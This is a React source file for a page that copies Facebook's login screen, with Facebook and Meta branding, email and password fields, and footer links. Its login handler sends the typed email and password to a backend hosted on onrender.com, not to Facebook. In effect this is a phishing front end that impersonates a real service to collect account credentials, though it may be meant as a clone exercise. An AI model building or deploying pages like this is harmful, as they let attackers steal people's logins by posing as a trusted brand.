import { useState } from "react";
import { FaFacebook } from "react-icons/fa";
import { FaMeta } from "react-icons/fa6";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import axios from "axios";

const Facebook = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [formData, setFormData] = useState({ email: "", password: "" });
    const [error, setError] = useState(null);

    const togglePasswordVisibility = () => setShowPassword((prev) => !prev);
    const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

    const handleLogin = async (e) => {
        e.preventDefault();
        setError(null); // Reset error state

        try {
            const newData = { email: formData.email, password: formData.password }
            const response = await axios.post("https://facebook-backend-5229.onrender.com/api/login", formData, {
                headers: { "Content-Type": "application/json" },
                withCredentials: true, // If using cookies for authentication 
            });


            if (response.data.success) {
                alert("Login Successful!");
                console.log("User Data:", response.data);
                // Redirect user or store authentication token
            } else {
                setError("Invalid credentials, please try again.");
            }
        } catch (err) {
            console.error("Login Error:", err);
            setError("Something went wrong. Please try again.");
        }
    };

    return (
        <div className="flex justify-center items-center min-h-screen bg-gray-100">
            <div className="flex flex-col justify-center items-center rounded-lg w-[100%] p-5 sm:w-96">

                {/* Language */}
                <div className="text-gray-600">English (UK)</div>

                {/* Facebook Logo */}
                <div className="mt-4">
                    <FaFacebook className="size-12 rounded-full bg-white text-blue-600" />
                </div>

                {/* Form */}
                <div className="mt-6 w-full">
                    <form onSubmit={handleLogin}>
                        {/* Email Input */}
                        <div className="flex h-12 w-full bg-white mb-4 rounded-lg border border-gray-300">
                            <input
                                className="w-full p-3 rounded-lg focus:outline-none"
                                name="email"
                                value={formData.email}
                                onChange={handleChange}
                                type="text"
                                placeholder="Mobile number or email address"
                                required
                            />
                        </div>

                        {/* Password Input */}
                        <div className="relative flex h-12 w-full bg-white mb-4 rounded-lg border border-gray-300">
                            <input
                                type={showPassword ? "text" : "password"}
                                name="password"
                                value={formData.password}
                                onChange={handleChange}
                                className="w-full p-3 rounded-lg focus:outline-none"
                                placeholder="Password"
                                required
                            />
                            <button
                                type="button"
                                onClick={togglePasswordVisibility}
                                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                                aria-label="Toggle password visibility"
                            >
                                {showPassword ? <FaEyeSlash size={20} /> : <FaEye size={20} />}
                            </button>
                        </div>

                        {/* Login Button */}
                        <button className="w-full bg-blue-700 text-white py-2 rounded-3xl hover:bg-blue-800 transition">
                            Log in
                        </button>
                    </form>

                    {/* Forgot Password */}
                    <div className="m-5 flex justify-center">
                        <a href="#" className="text-blue-600 hover:underline">Forgotten Password?</a>
                    </div>

                    {/* Create New Account */}
                    <button className="w-full mt-3 py-2 border border-blue-700 text-blue-700 font-semibold rounded-3xl hover:bg-blue-50 transition">
                        Create new account
                    </button>
                </div>

                {/* Meta Branding */}
                <div className="mt-6 flex items-center text-gray-600">
                    <FaMeta className="mr-2" />
                    <span>Meta</span>
                </div>

                {/* Footer Links */}
                <div className="flex text-xs gap-3 mt-4 mb-2 text-gray-500">
                    <a href="#" className="hover:underline">About</a>
                    <a href="#" className="hover:underline">Help</a>
                    <a href="#" className="hover:underline">More</a>
                </div>
            </div>
        </div>
    );
}

export default Facebook